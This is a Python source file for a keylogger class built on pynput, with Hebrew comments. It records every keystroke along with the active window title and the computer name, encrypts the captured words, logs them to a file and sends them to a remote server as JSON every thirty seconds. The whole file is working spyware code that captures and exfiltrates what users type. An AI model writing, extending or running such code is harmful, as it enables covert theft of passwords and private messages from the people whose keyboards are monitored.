from pynput.keyboard import Listener, Key
from logger import Logger
from window_utils import get_active_window_title, get_keyboard_layout, get_character_from_vk_code
from system_info import get_system_info
from keyboard_utils import get_modifiers_text, MODIFIER_KEYS
from Encryption import encryption
import datetime
import threading
from keylogger_service import handle_key_press  # <-- ייבוא הפונקציה

class KeyLogger:
    def __init__(self, server_url, log_file, flush_interval=30):
        self.logger = Logger(log_file=log_file, server_url=server_url)
        self.computer_name = get_system_info()["computer_name"]
        self.current_word = ""
        self.words_buffer = []
        self.current_window_title = ""
        self.last_active_hwnd = None
        self.pressed_keys = set()
        self.stop_logging = False

        self.flush_interval = flush_interval
        self.flush_timer = threading.Timer(self.flush_interval, self.flush_buffer_loop)
        self.flush_timer.start()

    def update_active_window(self):
        title, hwnd = get_active_window_title()
        if hwnd != self.last_active_hwnd:
            self.last_active_hwnd = hwnd
        self.current_window_title = title
        log_line = f"\n\n[Active Window: '{title}']\n"
        self.logger.write_to_file(log_line)
        print(log_line, end='')

    def add_word(self, word=None):
        if word is None:
            word = self.current_word
        if word:
            self.words_buffer.append(encryption(word))
            self.current_word = ""

    def flush_buffer(self, newline=False, final=False):
        if final and self.current_word:
            self.add_word()

        if not self.words_buffer:
            return

        line = ' '.join(self.words_buffer)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        active_window_to_send = self.current_window_title

        json_data = {
            "computer_name": self.computer_name,
            "timestamp": timestamp,
            "log": line,
            "active_window": active_window_to_send
        }

        self.logger.send_to_server(json_data)

        log_line = f"{line}  [{timestamp}]"
        log_line += f" [Window: {active_window_to_send}]\n"
        self.logger.write_to_file(log_line)

        if newline:
            print(f"  [{timestamp}]\n", end='')

        self.words_buffer = []

    def flush_buffer_loop(self):
        if not self.stop_logging:
            self.flush_buffer()
            self.flush_timer = threading.Timer(self.flush_interval, self.flush_buffer_loop)
            self.flush_timer.start()

    def on_key_press(self, key):
        return handle_key_press(key, self)  # <-- קריאה לפונקציה החדשה

    def on_key_release(self, key):
        if key in MODIFIER_KEYS:
            self.pressed_keys.discard(key)

    def run(self):
        print("Keylogger started. Press ESC to stop.\n")
        with Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
            listener.join()

        self.stop_logging = True
        self.flush_timer.cancel()
        self.flush_buffer(final=True)
